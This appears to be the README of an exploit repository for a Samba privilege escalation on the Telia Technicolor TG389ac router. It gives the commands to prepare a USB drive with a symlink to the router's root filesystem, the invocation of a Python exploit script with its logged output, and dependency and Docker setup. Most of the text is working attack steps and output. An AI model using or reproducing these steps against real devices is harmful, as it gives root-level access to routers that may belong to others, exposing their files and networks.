# FDEU-CVE-2020-1FC5
Telia Technicolor TG389ac v.17.1.7992 Samba privilege escalation exploit

## Requirements

* Local admin access
* Empty USB flash drive with EXT2 partition

## Prepare the flash drive

```
mkfs.ext2 /dev/sdX1
mkdir /tmp/sdX1
mount /dev/sdX1 /tmp/sdX1
cd /tmp/sdX1
touch exploit
ln -s / rootfs
cd ~
umount /tmp/sdX1
```

Plug the fash into the router's USB port.

## Run locally

```
# python3 tg389ac_samba_exploit.py http://192.168.1.254 admin
Password: 
[*] Init SRP authentication
[*] Get CSRF token
[*] Send authentication challenge
[*] Send authentication response
[*] Renew CSRF token
[*] Submit dummy samba config
[*] Submit samba exploit
[*] Reboot the router
b'{ "success":"true" }'
[*] Done. Wait until the rooter boots and open the network share
Example: \\192.168.1.254 or smb://192.168.1.254
```

## Dependencies

```
apt-get install python3 python3-requests python3-srp
```

## Docker

```
sudo docker build -t tg389ac_samba_exploit .
sudo docker run -ti tg389ac_samba_exploit /bin/bash
cd FDEU-CVE-2020-1FC
python3 tg389ac_samba_exploit.py
```
